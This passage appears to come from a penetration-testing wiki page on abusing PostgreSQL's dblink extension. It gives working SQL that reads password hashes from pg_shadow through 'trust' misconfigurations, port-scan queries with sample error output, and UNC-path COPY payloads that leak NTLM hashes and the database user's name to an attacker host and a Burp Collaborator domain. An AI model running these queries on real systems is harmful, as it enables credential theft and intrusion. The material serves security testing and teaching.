  \n**Find** [**more information about these attacks in the original paper**](http://www.leidecker.info/pgshell/Having_Fun_With_PostgreSQL.txt).\n\
  \nSince **PostgreSQL 9.1**, installation of additional modules is simple. [Registered extensions like `dblink`](https://www.postgresql.org/docs/current/contrib.html)\
  \ can be installed with [`CREATE EXTENSION`](https://www.postgresql.org/docs/current/sql-createextension.html):\n\n```sql\n\
  CREATE EXTENSION dblink;\n```\n\nOnce you have dblink loaded you could be able to perform some interesting tricks:\n\n###\
  \ Privilege Escalation\n\nThe file `pg_hba.conf` could be bad configured **allowing connections** from **localhost as any\
  \ user** without needing to know the password. This file could be typically found in `/etc/postgresql/12/main/pg_hba.conf`\
  \ and a bad configuration looks like:\n\n```\nlocal    all    all    trust\n```\n\n_Note that this configuration is commonly\
  \ used to modify the password of a db user when the admin forget it, so sometimes you may find it._\\\n_Note also that the\
  \ file pg_hba.conf is readable only by postgres user and group and writable only by postgres user._\n\nThis case is **useful\
  \ if** you **already** have a **shell** inside the victim as it will allow you to connect to postgresql database.\n\nAnother\
  \ possible misconfiguration consist on something like this:\n\n```\nhost    all     all     127.0.0.1/32    trust\n```\n\
  \nAs it will allow everybody from the localhost to connect to the database as any user.\\\nIn this case and if the **`dblink`**\
  \ function is **working**, you could **escalate privileges** by connecting to the database through an already established\
  \ connection and access data shouldn't be able to access:\n\n```sql\nSELECT * FROM dblink('host=127.0.0.1\n            \
  \              user=postgres\n                          dbname=postgres',\n                         'SELECT datname FROM\
  \ pg_database')\n                      RETURNS (result TEXT);\n\nSELECT * FROM dblink('host=127.0.0.1\n                \
  \          user=postgres\n                          dbname=postgres',\n                         'select usename, passwd\
  \ from pg_shadow')\n                      RETURNS (result1 TEXT, result2 TEXT);\n```\n\n### Port Scanning\n\nAbusing `dblink_connect`\
  \ you could also **search open ports**. If that **function doesn't work you should try to use `dblink_connect_u()` as the\
  \ documentation says that `dblink_connect_u()` is identical to `dblink_connect()`, except that it will allow non-superusers\
  \ to connect using any authentication method\\_.\n\n```sql\nSELECT * FROM dblink_connect('host=216.58.212.238\n        \
  \                          port=443\n                                  user=name\n                                  password=secret\n\
  \                                  dbname=abc\n                                  connect_timeout=10');\n//Different response\n\
  // Port closed\nRROR:  could not establish connection\nDETAIL:  could not connect to server: Connection refused\n\tIs the\
  \ server running on host \"127.0.0.1\" and accepting\n\tTCP/IP connections on port 4444?\n\n// Port Filtered/Timeout\nERROR:\
  \  could not establish connection\nDETAIL:  timeout expired\n\n// Accessing HTTP server\nERROR:  could not establish connection\n\
  DETAIL:  timeout expired\n\n// Accessing HTTPS server\nERROR:  could not establish connection\nDETAIL:  received invalid\
  \ response to SSL negotiation:\n```\n\nNote that **before** being able to use `dblink_connect` or `dblink_connect_u` you\
  \ may need to execute:\n\n```\nCREATE extension dblink;\n```\n\n### UNC path - NTLM hash disclosure\n\n```sql\n-- can be\
  \ used to leak hashes to Responder/equivalent\nCREATE TABLE test();\nCOPY test FROM E'\\\\\\\\attacker-machine\\\\footestbar.txt';\n\
  ```\n\n```sql\n-- to extract the value of user and send it to Burp Collaborator\nCREATE TABLE test(retval text);\nCREATE\
  \ OR REPLACE FUNCTION testfunc() RETURNS VOID AS $$\nDECLARE sqlstring TEXT;\nDECLARE userval TEXT;\nBEGIN\nSELECT INTO\
  \ userval (SELECT user);\nsqlstring := E'COPY test(retval) FROM E\\'\\\\\\\\\\\\\\\\'||userval||E'.xxxx.burpcollaborator.net\\\
  \\\\\\test.txt\\'';\nEXECUTE sqlstring;\nEND;\n$$ LANGUAGE plpgsql SECURITY DEFINER;\nSELECT testfunc();\n```\n\n{{#include\
